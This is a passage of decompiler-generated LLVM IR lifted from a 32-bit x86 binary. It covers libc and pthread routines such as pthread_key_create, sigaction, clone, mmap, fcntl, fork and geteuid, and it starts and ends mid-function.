dec_label_pc_804f493:                             ; preds = %dec_label_pc_804f481, %dec_label_pc_804f47b, %dec_label_pc_804f48c
  %v0_804f493 = phi i32 [ %v0_804f481, %dec_label_pc_804f481 ], [ %v0_804f481, %dec_label_pc_804f47b ], [ %v0_804f493.pre, %dec_label_pc_804f48c ]
  %v1_804f493 = inttoptr i32 %v0_804f493 to i32*
  %v2_804f493 = load i32, i32* %v1_804f493, align 4
  store i32 %v2_804f493, i32* %edx.global-to-local, align 4
  %v12_804f495 = icmp eq i32 %v2_804f493, %v1_804f46c
  %v1_804f497 = icmp eq i1 %v12_804f495, false
  br i1 %v1_804f497, label %dec_label_pc_804f47b, label %dec_label_pc_804f499

dec_label_pc_804f499:                             ; preds = %dec_label_pc_804f493, %dec_label_pc_804f44d
  store i32 ptrtoint (i32* @global_var_8065040.201 to i32), i32* %stack_var_-28, align 4
  %v1_804f4a1 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8065040.201 to i32))
  br label %dec_label_pc_804f4a8

dec_label_pc_804f4a8:                             ; preds = %dec_label_pc_804f439, %dec_label_pc_804f499
  %storemerge = phi i32 [ 22, %dec_label_pc_804f439 ], [ 0, %dec_label_pc_804f499 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804f493, { 0, 2, 1 }
  uselistorder i32 %v0_804f471, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 236, { 0, 1, 2, 3, 5, 6, 7, 8, 4 }
  uselistorder i32 (i32)* @thread_self.19, { 5, 4, 0, 3, 1, 2, 6 }
  uselistorder i32* @global_var_80626e4.143, { 2, 3, 4, 0, 5, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_804f4a8, { 1, 0 }
  uselistorder label %dec_label_pc_804f493, { 2, 0, 1 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* @ebx, align 4
  %v1_804f4b9 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065040.201 to i32))
  store i32 %v1_804f4b9, i32* %eax.global-to-local, align 4
  %v0_804f4fb.pr = load i32, i32* @ebx, align 4
  %v7_804f50110 = icmp sgt i32 %v0_804f4fb.pr, 1023
  br i1 %v7_804f50110, label %dec_label_pc_804f503, label %dec_label_pc_804f4c3

dec_label_pc_804f4c3:                             ; preds = %entry, %dec_label_pc_804f4fa
  %v0_804f4fa11 = phi i32 [ %v1_804f4fa, %dec_label_pc_804f4fa ], [ %v0_804f4fb.pr, %entry ]
  %v1_804f4c3 = mul i32 %v0_804f4fa11, 8
  %v2_804f4c3 = add i32 %v1_804f4c3, ptrtoint (i32* @global_var_8063040.199 to i32)
  %v3_804f4c3 = inttoptr i32 %v2_804f4c3 to i32*
  %v4_804f4c3 = load i32, i32* %v3_804f4c3, align 8
  %v5_804f4c3 = icmp eq i32 %v4_804f4c3, 0
  %v1_804f4cb = icmp eq i1 %v5_804f4c3, false
  br i1 %v1_804f4cb, label %dec_label_pc_804f4fa, label %dec_label_pc_804f4cd

dec_label_pc_804f4cd:                             ; preds = %dec_label_pc_804f4c3
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v3_804f4c3, align 8
  %v0_804f4df = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4df = load i32, i32* @ebx, align 4
  %v2_804f4df = mul i32 %v1_804f4df, 8
  %v3_804f4df = add i32 %v2_804f4df, ptrtoint (i32* @global_var_8063044.200 to i32)
  %v4_804f4df = inttoptr i32 %v3_804f4df to i32*
  store i32 %v0_804f4df, i32* %v4_804f4df, align 4
  %v1_804f4eb = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8065040.201 to i32))
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v0_804f4f4 = load i32, i32* @ebx, align 4
  store i32 %v0_804f4f4, i32* %arg1, align 4
  br label %dec_label_pc_804f515

dec_label_pc_804f4fa:                             ; preds = %dec_label_pc_804f4c3
  %v1_804f4fa = add nsw i32 %v0_804f4fa11, 1
  store i32 %v1_804f4fa, i32* @ebx, align 4
  %v7_804f501 = icmp sgt i32 %v0_804f4fa11, 1022
  br i1 %v7_804f501, label %dec_label_pc_804f503, label %dec_label_pc_804f4c3

dec_label_pc_804f503:                             ; preds = %dec_label_pc_804f4fa, %entry
  %v1_804f50b = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8065040.201 to i32))
  br label %dec_label_pc_804f515

dec_label_pc_804f515:                             ; preds = %dec_label_pc_804f4cd, %dec_label_pc_804f503
  %storemerge = phi i32 [ 11, %dec_label_pc_804f503 ], [ 0, %dec_label_pc_804f4cd ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f4fa, { 1, 0 }
  uselistorder i32 %v0_804f4fa11, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8065040.201 to i32), { 1, 0, 2, 3, 6, 4, 7, 5, 8 }
  uselistorder label %dec_label_pc_804f515, { 1, 0 }
  uselistorder label %dec_label_pc_804f4c3, { 1, 0 }
}

define i32 @__restore_rt(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f51c:
  %v0_804f521 = load i32, i32* @ebx, align 4
  %v1_804f521 = inttoptr i32 %v0_804f521 to %sigcontext*
  %v2_804f521 = call i32 @sigreturn(%sigcontext* %v1_804f521)
  %v0_804f529 = load i32, i32* @ebx, align 4
  %v1_804f529 = inttoptr i32 %v0_804f529 to %sigcontext*
  %v2_804f529 = call i32 @sigreturn(%sigcontext* %v1_804f529)
  ret i32 %v2_804f529
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804f52b = load i32, i32* @esi, align 4
  %v0_804f52c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804f541 = icmp eq i32* %arg2, null
  br i1 %v1_804f541, label %dec_label_pc_804f594, label %dec_label_pc_804f545

dec_label_pc_804f545:                             ; preds = %entry
  %v2_804f545 = load i32, i32* %arg2, align 4
  store i32 %v2_804f545, i32* %stack_var_-148, align 4
  %v1_804f54e = add i32 %tmp11, 4
  %v3_804f560 = bitcast i32* %stack_var_-136 to i16*
  %v4_804f560 = call i32 @memcpy(i16* %v3_804f560, i32 %v1_804f54e, i32 128)
  %v1_804f565 = add i32 %tmp11, 132
  %v2_804f57f = inttoptr i32 %v1_804f565 to i8*
  %v3_804f57f = load i8, i8* %v2_804f57f, align 1
  %v4_804f57f = and i8 %v3_804f57f, 4
  %v5_804f57f = icmp eq i8 %v4_804f57f, 0
  %v1_804f586 = icmp eq i1 %v5_804f57f, false
  br i1 %v1_804f586, label %dec_label_pc_804f594, label %dec_label_pc_804f588

dec_label_pc_804f588:                             ; preds = %dec_label_pc_804f545
  br label %dec_label_pc_804f594

dec_label_pc_804f594:                             ; preds = %dec_label_pc_804f588, %dec_label_pc_804f545, %entry
  %v1_804f596 = icmp eq i32 %arg3, 0
  br i1 %v1_804f596, label %dec_label_pc_804f59e, label %dec_label_pc_804f59a

dec_label_pc_804f59a:                             ; preds = %dec_label_pc_804f594
  %v2_804f59a = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804f59e

dec_label_pc_804f59e:                             ; preds = %dec_label_pc_804f594, %dec_label_pc_804f59a
  %v0_804f5ad = phi i32 [ 0, %dec_label_pc_804f594 ], [ %v2_804f59a, %dec_label_pc_804f59a ]
  br i1 %v1_804f541, label %dec_label_pc_804f5ab, label %dec_label_pc_804f5a4

dec_label_pc_804f5a4:                             ; preds = %dec_label_pc_804f59e
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804f5ab

dec_label_pc_804f5ab:                             ; preds = %dec_label_pc_804f59e, %dec_label_pc_804f5a4
  %v0_804f5ae = phi %sigaction* [ null, %dec_label_pc_804f59e ], [ %phitmp, %dec_label_pc_804f5a4 ]
  %v5_804f5b6 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804f5ae, i32 %v0_804f5ad, i32 8)
  store i32 %v5_804f5b6, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f596, label %dec_label_pc_804f5f9, label %dec_label_pc_804f5c4

dec_label_pc_804f5c4:                             ; preds = %dec_label_pc_804f5ab
  %v2_804f5c4 = icmp slt i32 %v5_804f5b6, 0
  br i1 %v2_804f5c4, label %dec_label_pc_804f5f9, label %dec_label_pc_804f5c8

dec_label_pc_804f5c8:                             ; preds = %dec_label_pc_804f5c4
  %v3_804f5c8 = load i32, i32* %stack_var_-288, align 4
  %v2_804f5cc = inttoptr i32 %arg3 to i32*
  store i32 %v3_804f5c8, i32* %v2_804f5cc, align 4
  %v2_804f5d4 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804f5d9 = add i32 %arg3, 4
  %v3_804f5dd = inttoptr i32 %v1_804f5d9 to i16*
  %v4_804f5dd = call i32 @memcpy(i16* %v3_804f5dd, i32 %v2_804f5d4, i32 128)
  %v2_804f5e6 = add i32 %arg3, 132
  %v3_804f5e6 = inttoptr i32 %v2_804f5e6 to i32*
  %v2_804f5f3 = add i32 %arg3, 136
  %v3_804f5f3 = inttoptr i32 %v2_804f5f3 to i32*
  %v0_804f5f9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f5f9

dec_label_pc_804f5f9:                             ; preds = %dec_label_pc_804f5c4, %dec_label_pc_804f5ab, %dec_label_pc_804f5c8
  %v0_804f5f9 = phi i32 [ %v5_804f5b6, %dec_label_pc_804f5c4 ], [ %v5_804f5b6, %dec_label_pc_804f5ab ], [ %v0_804f5f9.pre, %dec_label_pc_804f5c8 ]
  store i32 %v0_804f52c, i32* @ebx, align 4
  store i32 %v0_804f52b, i32* @esi, align 4
  ret i32 %v0_804f5f9

; uselistorder directives
  uselistorder i1 %v1_804f596, { 1, 0 }
  uselistorder i1 %v1_804f541, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_804f5f9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f5ab, { 1, 0 }
  uselistorder label %dec_label_pc_804f59e, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 -22, i32* @eax, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804f60d = icmp eq i32 %arg1, 0
  br i1 %v1_804f60d, label %dec_label_pc_804f66b, label %dec_label_pc_804f611

dec_label_pc_804f611:                             ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f615 = icmp eq i32 %arg2, 0
  br i1 %v1_804f615, label %dec_label_pc_804f66b, label %dec_label_pc_804f619

dec_label_pc_804f619:                             ; preds = %dec_label_pc_804f611
  %v1_804f619 = and i32 %arg2, -16
  %v1_804f61c = add i32 %v1_804f619, -28
  store i32 %v1_804f61c, i32* %ecx.global-to-local, align 4
  %v2_804f623 = add i32 %v1_804f619, -16
  %v3_804f623 = inttoptr i32 %v2_804f623 to i32*
  store i32 %arg4, i32* %v3_804f623, align 16
  %v1_804f62a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f62a = add i32 %v1_804f62a, 8
  %v3_804f62a = inttoptr i32 %v2_804f62a to i32*
  store i32 %arg1, i32* %v3_804f62a, align 4
  %v0_804f62d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f62d = add i32 %v0_804f62d, 4
  %v2_804f62d = inttoptr i32 %v1_804f62d to i32*
  store i32 0, i32* %v2_804f62d, align 4
  %v0_804f634 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f634 = inttoptr i32 %v0_804f634 to i32*
  store i32 0, i32* %v1_804f634, align 4
  %v0_804f63a = load i32, i32* @ebx, align 4
  store i32 %v0_804f63a, i32* %stack_var_-4, align 4
  %v0_804f63b = load i32, i32* @esi, align 4
  %v0_804f63c = load i32, i32* @edi, align 4
  store i32 %v0_804f63c, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804f652 = load i32, i32* %stack_var_0, align 4
  %v4_804f652 = call i32 @clone(i32 %v0_804f63c, i32 %v0_804f63b, i32 %v0_804f63a, i32 %v3_804f652)
  store i32 %v4_804f652, i32* @eax, align 4
  %v2_804f654 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f654, i32* @edi, align 4
  store i32 %v0_804f63b, i32* @esi, align 4
  %v2_804f656 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f656, i32* @ebx, align 4
  %v2_804f657 = icmp slt i32 %v4_804f652, 0
  %v2_804f659 = icmp eq i1 %v2_804f657, false
  br i1 %v2_804f659, label %dec_label_pc_804f65b, label %dec_label_pc_804f66b

dec_label_pc_804f65b:                             ; preds = %dec_label_pc_804f619
  %v1_804f657 = icmp eq i32 %v4_804f652, 0
  br i1 %v1_804f657, label %dec_label_pc_804f65e, label %dec_label_pc_804f65d

dec_label_pc_804f65d:                             ; preds = %dec_label_pc_804f65b
  ret i32 %v4_804f652

dec_label_pc_804f65e:                             ; preds = %dec_label_pc_804f65b
  store i32 %v0_804f63b, i32* @ebp, align 4
  store i32 134542946, i32* %stack_var_-4, align 4
  call void @__pseudo_call(i32 %v2_804f656)
  store i32 0, i32* @ebx, align 4
  call void @exit(i32 0)
  unreachable

dec_label_pc_804f66b:                             ; preds = %dec_label_pc_804f619, %dec_label_pc_804f611, %entry
  %v0_804f66b = call i32 @__syscall_error()
  ret i32 %v0_804f66b

; uselistorder directives
  uselistorder i32 %v4_804f652, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f63b, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__sigsetjmp(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* %stack_var_4, align 4
  store i32 %tmp2, i32* %eax.global-to-local, align 4
  %v0_804f674 = load i32, i32* @ebx, align 4
  store i32 %v0_804f674, i32* %arg2, align 4
  %v0_804f676 = load i32, i32* @esi, align 4
  %v2_804f676 = add i32 %tmp2, 4
  %v3_804f676 = inttoptr i32 %v2_804f676 to i32*
  store i32 %v0_804f676, i32* %v3_804f676, align 4
  %v0_804f679 = load i32, i32* @edi, align 4
  %v1_804f679 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f679 = add i32 %v1_804f679, 8
  %v3_804f679 = inttoptr i32 %v2_804f679 to i32*
  store i32 %v0_804f679, i32* %v3_804f679, align 4
  %v2_804f67c = ptrtoint i32* %stack_var_4 to i32
  %v1_804f680 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f680 = add i32 %v1_804f680, 16
  %v3_804f680 = inttoptr i32 %v2_804f680 to i32*
  store i32 %v2_804f67c, i32* %v3_804f680, align 4
  %v1_804f686 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f686 = add i32 %v1_804f686, 20
  %v3_804f686 = inttoptr i32 %v2_804f686 to i32*
  store i32 %arg1, i32* %v3_804f686, align 4
  %v0_804f689 = load i32, i32* @ebp, align 4
  %v1_804f689 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f689 = add i32 %v1_804f689, 12
  %v3_804f689 = inttoptr i32 %v2_804f689 to i32*
  store i32 %v0_804f689, i32* %v3_804f689, align 4
  %v0_804f68c = call i32 @__sigjmp_save()
  store i32 %v0_804f68c, i32* %eax.global-to-local, align 4
  ret i32 %v0_804f68c

; uselistorder directives
  uselistorder i32* %stack_var_4, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804f694 = load i32, i32* @ebx, align 4
  %v2_804f69b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804f69b, i32* @ebx, align 4
  %v8_804f69f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804f694, i32* @ebx, align 4
  %v3_804f6a8 = icmp ugt i32 %v8_804f69f, -4096
  call void @__pseudo_cond_branch(i1 %v3_804f6a8, i32 134562344)
  ret i32 %v8_804f69f

; uselistorder directives
  uselistorder i32 %v8_804f69f, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f6b0 = load i32, i32* @edi, align 4
  %v0_804f6b1 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804f6c5 = add i32 %arg2, -12
  %v6_804f6cf = icmp ugt i32 %v1_804f6c5, 2
  br i1 %v6_804f6cf, label %dec_label_pc_804f6df, label %dec_label_pc_804f6d1

dec_label_pc_804f6d1:                             ; preds = %entry
  %v4_804f6d5 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f6c5)
  br label %dec_label_pc_804f701

dec_label_pc_804f6df:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f6e7 = call i32 @fcntl(i32 %v0_804f6b1)
  store i32 %v1_804f6e7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f6e7, -4095
  br i1 %tmp, label %dec_label_pc_804f6ff, label %dec_label_pc_804f6f3

dec_label_pc_804f6f3:                             ; preds = %dec_label_pc_804f6df
  %v1_804f6f3 = call i32 @__errno_location(i32 %v0_804f6b1)
  %v0_804f6f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f6f8 = sub i32 0, %v0_804f6f8
  %v2_804f6fa = inttoptr i32 %v1_804f6f3 to i32*
  store i32 %v1_804f6f8, i32* %v2_804f6fa, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f6ff

dec_label_pc_804f6ff:                             ; preds = %dec_label_pc_804f6df, %dec_label_pc_804f6f3
  %v0_804f6ff = phi i32 [ %v1_804f6e7, %dec_label_pc_804f6df ], [ -1, %dec_label_pc_804f6f3 ]
  br label %dec_label_pc_804f701

dec_label_pc_804f701:                             ; preds = %dec_label_pc_804f6d1, %dec_label_pc_804f6ff
  %v0_804f706 = phi i32 [ %v4_804f6d5, %dec_label_pc_804f6d1 ], [ %v0_804f6ff, %dec_label_pc_804f6ff ]
  store i32 %v0_804f6b1, i32* @ebx, align 4
  store i32 %v0_804f6b0, i32* @edi, align 4
  ret i32 %v0_804f706

; uselistorder directives
  uselistorder i32 %v1_804f6e7, { 1, 0, 2 }
  uselistorder i32 %v0_804f6b1, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f701, { 1, 0 }
  uselistorder label %dec_label_pc_804f6ff, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f708 = load i32, i32* @edi, align 4
  store i32 %v0_804f708, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804f720 = load i32, i32* @ebx, align 4
  %v1_804f728 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804f728, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f728, -4095
  br i1 %tmp, label %dec_label_pc_804f740, label %dec_label_pc_804f734

dec_label_pc_804f734:                             ; preds = %entry
  %v1_804f734 = call i32 @__errno_location(i32 %v0_804f720)
  %v0_804f739 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f739 = sub i32 0, %v0_804f739
  %v2_804f73b = inttoptr i32 %v1_804f734 to i32*
  store i32 %v1_804f739, i32* %v2_804f73b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f740

dec_label_pc_804f740:                             ; preds = %entry, %dec_label_pc_804f734
  %v0_804f740 = phi i32 [ %v1_804f728, %entry ], [ -1, %dec_label_pc_804f734 ]
  %v2_804f745 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f745, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f740

; uselistorder directives
  uselistorder i32 %v1_804f728, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f740, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804f749 = load i32, i32* @esi, align 4
  store i32 %v0_804f749, i32* %stack_var_-8, align 4
  %v4_804f751 = ptrtoint %sigaction* %arg2 to i32
  store i32 %v4_804f751, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804f75d = load i32, i32* @ebx, align 4
  %v7_804f765 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804f765, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804f765, -4095
  br i1 %tmp, label %dec_label_pc_804f77d, label %dec_label_pc_804f771

dec_label_pc_804f771:                             ; preds = %entry
  %v1_804f771 = call i32 @__errno_location(i32 %v0_804f75d)
  %v0_804f776 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f776 = sub i32 0, %v0_804f776
  %v2_804f778 = inttoptr i32 %v1_804f771 to i32*
  store i32 %v1_804f776, i32* %v2_804f778, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f77d

dec_label_pc_804f77d:                             ; preds = %entry, %dec_label_pc_804f771
  %v0_804f77d = phi i32 [ %v7_804f765, %entry ], [ -1, %dec_label_pc_804f771 ]
  %v2_804f780 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f780, i32* @esi, align 4
  ret i32 %v0_804f77d

; uselistorder directives
  uselistorder i32 %v7_804f765, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f77d, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f7ac = load i32, i32* @edi, align 4
  store i32 %v0_804f7ac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804f7b4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f7bc = call i32 @close(i32 %v0_804f7b4)
  store i32 %v0_804f7b4, i32* @ebx, align 4
  store i32 %v1_804f7bc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f7bc, -4095
  br i1 %tmp, label %dec_label_pc_804f7d4, label %dec_label_pc_804f7c8

dec_label_pc_804f7c8:                             ; preds = %entry
  %v1_804f7c8 = call i32 @__errno_location(i32 %v0_804f7b4)
  %v0_804f7cd = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7cd = sub i32 0, %v0_804f7cd
  %v2_804f7cf = inttoptr i32 %v1_804f7c8 to i32*
  store i32 %v1_804f7cd, i32* %v2_804f7cf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f7d4

dec_label_pc_804f7d4:                             ; preds = %entry, %dec_label_pc_804f7c8
  %v0_804f7d4 = phi i32 [ %v1_804f7bc, %entry ], [ -1, %dec_label_pc_804f7c8 ]
  %v2_804f7d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f7d6, i32* @edx, align 4
  %v2_804f7d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f7d8, i32* @edi, align 4
  ret i32 %v0_804f7d4

; uselistorder directives
  uselistorder i32 %v1_804f7bc, { 1, 0, 2 }
  uselistorder i32 %v0_804f7b4, { 1, 0, 2 }
  uselistorder i32 (i32)* @close, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f7d4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f7dc = load i32, i32* @ebx, align 4
  store i32 %v0_804f7dc, i32* %stack_var_-4, align 4
  %v1_804f7e5 = call i32 @fork(i32 %v0_804f7dc)
  store i32 %v1_804f7e5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f7e5, -4095
  br i1 %tmp, label %dec_label_pc_804f7fc, label %dec_label_pc_804f7f0

dec_label_pc_804f7f0:                             ; preds = %entry
  %v0_804f7f0 = load i32, i32* %stack_var_-4, align 4
  %v1_804f7f0 = call i32 @__errno_location(i32 %v0_804f7f0)
  %v0_804f7f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f7f5 = sub i32 0, %v0_804f7f5
  %v2_804f7f7 = inttoptr i32 %v1_804f7f0 to i32*
  store i32 %v1_804f7f5, i32* %v2_804f7f7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f7fc

dec_label_pc_804f7fc:                             ; preds = %entry, %dec_label_pc_804f7f0
  %v0_804f7fc = phi i32 [ %v1_804f7e5, %entry ], [ -1, %dec_label_pc_804f7f0 ]
  %v2_804f800 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f800, i32* @ebx, align 4
  ret i32 %v0_804f7fc

; uselistorder directives
  uselistorder i32 %v1_804f7e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @fork, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f7fc, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f804 = load i32, i32* @edi, align 4
  store i32 %v0_804f804, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804f80c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f814 = call i32 @fsync(i32 %v0_804f80c)
  store i32 %v1_804f814, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f814, -4095
  br i1 %tmp, label %dec_label_pc_804f82c, label %dec_label_pc_804f820

dec_label_pc_804f820:                             ; preds = %entry
  %v1_804f820 = call i32 @__errno_location(i32 %v0_804f80c)
  %v0_804f825 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f825 = sub i32 0, %v0_804f825
  %v2_804f827 = inttoptr i32 %v1_804f820 to i32*
  store i32 %v1_804f825, i32* %v2_804f827, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f82c

dec_label_pc_804f82c:                             ; preds = %entry, %dec_label_pc_804f820
  %v0_804f82c = phi i32 [ %v1_804f814, %entry ], [ -1, %dec_label_pc_804f820 ]
  %v2_804f830 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f830, i32* @edi, align 4
  ret i32 %v0_804f82c

; uselistorder directives
  uselistorder i32 %v1_804f814, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f82c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f834 = load i32, i32* @ebx, align 4
  store i32 %v0_804f834, i32* %stack_var_-4, align 4
  %v1_804f83d = call i32 @int80_syscall(i32 201)
  store i32 %v1_804f83d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f83d, -4095
  br i1 %tmp, label %dec_label_pc_804f854, label %dec_label_pc_804f848

dec_label_pc_804f848:                             ; preds = %entry
  %v0_804f848 = load i32, i32* %stack_var_-4, align 4
  %v1_804f848 = call i32 @__errno_location(i32 %v0_804f848)
